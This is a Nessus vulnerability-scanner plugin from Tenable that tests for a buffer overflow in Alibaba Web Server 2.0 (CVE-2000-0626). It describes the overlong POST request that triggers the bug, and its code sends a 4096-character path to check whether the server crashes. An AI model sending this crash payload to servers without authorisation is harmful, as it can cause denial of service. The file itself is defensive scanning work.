#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10012);
 script_version ("$Revision: 1.39 $");
 script_cvs_date("$Date: 2011/03/14 21:48:01 $");

 script_cve_id("CVE-2000-0626");
 script_bugtraq_id(1482);
 script_osvdb_id(12);

 script_name(english: "Alibaba Web Server 2.0 HTTP Request Overflow DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server seems to be vulnerable to a buffer overflow." );
 script_set_attribute(attribute:"description", value:
"It is possible to make the remote web server execute
arbitrary commands by sending the following request:

	POST AA[...]AA/ HTTP/1.0
	
This problem may allow an attacker to execute arbitrary code on
the remote system or create a denial of service (DoS) attack." );
 script_set_attribute(attribute:"solution", value:
"At the time of this writing, no solution was available. 
Check with your vendor for a possible patch, or consider changing your
web server." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "1999/10/29");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/07/18");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english: "Alibaba buffer overflow");
 script_category(ACT_MIXED_ATTACK);
 script_copyright(english:"This script is Copyright (C) 1999-2011 Tenable Network Security, Inc.");
 script_family(english: "Web Servers"); 
 script_dependencie("http_version.nasl", "www_too_long_url.nasl");
 script_exclude_keys("www/too_long_url_crash");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
banner = get_http_banner(port: port);
 
if(!egrep(pattern:"^Server:.*[aA]libaba.*", string:banner)) exit(0);

if(safe_checks())
{
  if ( report_paranoia < 2 ) exit(0);
  security_hole(port:port, extra:
"Nessus reports this vulnerability using only information that 
was gathered. Use caution when testing without safe checks 
enabled.");
  exit(0);
}

if(http_is_dead(port:port))exit(0);
r = http_send_recv3(port: port, method: 'POST', item: strcat(crap(4096), "/"));
if (http_is_dead(port: port, retry: 3)) security_hole(port);
